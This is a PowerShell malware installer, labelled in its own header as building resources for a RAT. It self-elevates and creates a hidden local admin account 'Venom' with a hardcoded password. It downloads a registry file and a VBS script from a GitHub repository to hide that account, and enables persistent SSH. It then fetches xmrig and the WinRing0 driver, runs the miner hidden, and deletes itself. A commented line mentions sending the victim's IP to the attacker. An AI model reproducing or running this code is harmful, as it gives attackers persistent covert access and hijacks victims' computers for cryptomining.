# builds resources for RAT

# random string for directories
function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}


#create admin

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Exit
} else {
    # Create a new local admin account
    $username = "Venom"
    $password = ConvertTo-SecureString "V3n0m" -AsPlainText -Force
    New-LocalUser $username -Password $password -FullName "Venom" -Description "Local admin account created via PowerShell"
    Add-LocalGroupMember -Group "Administrators" -Member $username
}


## variables
$wd = random_text
$path = "$env:temp/$wd"

$initial_dir = Get-Location


# create admin user
#$NewLocalAdmin = "Venom"
#$Password = (ConvertTo-SecureString "V3n0m" -AsPlainText -Force)
#Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password

# send ip to attacker
#./smtp.ps1

#goto temp, make working dir
mkdir $path
cd $path
# mv $initial_dir/smtp.txt ./smtp.ps1
#./smtp.ps1

# registry to hide  local admin
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wrev.reg -OutFile "wrev.reg"

#visual basic scrit to download the registry
Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/calty.vbs -OutFile "calty.vbs"

# enabling  persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

#install the registry
./wrev.reg; ./calty

#Create rig Folder within Folder
New-Item -Name "$wd" -Path "$path" -ItemType Directory
cd $wd

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/SHA256SUMS -OutFile "SHA256SUMS.txt"

Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/WinRing0x64.sys -OutFile "WinRing0x64.sys"

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/benchmark_10M.cmd -OutFile "benchmark_10M.cmd"

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/benchmark_1M.cmd -OutFile "benchmark_1M.cmd"

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/start.cmd -OutFile "start.cmd"

Invoke-WebRequest -Uri https://github.com/P0k3m0n-unleashed/ProjSucc/blob/master/Venom/rig/xmrig.exe -OutFile "xmrig.exe"

Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/rig/config.json -OutFile "config.json"

# start rig
powershell -windowstyle hidden -ExecutionPolicy Bypass ./start.cmd


# hide venom user

# self delete
cd $initial_dir
del installer.ps1

